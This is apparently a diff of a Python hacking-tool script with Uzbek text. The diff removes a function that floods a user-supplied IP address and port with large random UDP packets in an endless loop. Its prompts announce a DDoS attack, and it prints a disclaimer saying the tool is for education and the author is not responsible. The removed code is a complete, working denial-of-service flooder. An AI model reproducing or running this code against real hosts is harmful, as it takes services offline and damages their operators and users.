@@ -1,26 +1,6 @@
 #Tuzuvchi Asadbek Abdubannopov
 #Yangilangan sana: 08/30/2023 10:41
 
-def runddos():
-    import socket,os,time,random 
-    os.system('cls')
-    
-    
-    print("Bu o'quv maqsadida holos. Har kim qilayotgan ishiga o'zi javob beradi.\nSiz qilayotgan ishingizga dasturchi aybdor emas!")
-    s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
-
-    packet=random._urandom(21110)
-
-    port=int(input("--[#]-- Istalgan portingizni kiriting:  "))
-
-    ip=input("--[#]-- Nishon IP adressini kiritning:  ")
-
-    sent=0
-
-    while True:
-       s.sendto(packet,(ip,port))
-       sent+=1
-       print("--[#]-- DDOS HUJUM QILINYAPTI {} port - {} ip - {} Packetlar soni".format(port,ip,sent))
 
 
 def runping():
